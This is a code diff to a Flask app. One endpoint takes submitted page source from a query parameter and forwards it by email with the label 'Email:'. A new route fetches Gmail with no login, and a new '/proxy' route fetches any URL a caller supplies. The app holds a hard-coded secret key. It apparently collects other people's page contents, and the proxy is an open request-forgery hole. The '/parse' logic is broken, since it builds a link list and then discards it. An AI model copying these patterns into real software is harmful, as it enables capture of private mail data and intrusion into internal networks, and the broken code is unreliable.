@@ -12,7 +12,8 @@ from flask_mail import Mail, Message
 # import threading
 from flask import Flask, redirect, url_for
 from flask_oauthlib.client import OAuth
-
+from bs4 import BeautifulSoup
+import requests
 app = Flask(__name__)
 app.config.from_object(__name__)
 app.config['SECRET_KEY'] = '7d441f27d441f27567d441f2b6176a'
@@ -73,15 +74,38 @@ def submit_page_source():
     page_source = request.args.get('page_source')
     # Do something with the page source, such as store it in a database or write it to a file
     print(page_source)
-    Notify("Han Page Source aa gaya hai")
+    Notify("Email: "+ page_source)
 
 
 @app.route('/page')
 def page():
     return render_template("page.html")
 
+@app.route('/parse')
+def parse():
+    response = requests.get('https://mail.google.com/mail/u/0')
 
+    # parse the HTML content of the response using BeautifulSoup
+    soup = BeautifulSoup(response.content, 'html.parser')
 
+    # find all the links on the page
+    links = soup.find_all('a')
+
+    # format the links as an HTML list
+    link_list = '<ul>'
+    for link in links:
+        link_list += f'<li><a href="{link.get("href")}">{link.text}</a></li>'
+    link_list += '</ul>'
+
+    # return the HTML list as the response
+    return str(soup)
+
+@app.route('/proxy', methods=['GET'])
+def proxy():
+    url = request.args.get('url')
+    headers = {'User-Agent': 'Mozilla/5.0'}
+    response = requests.get(url, headers=headers)
+    return response.text
 
 
 def create_id():
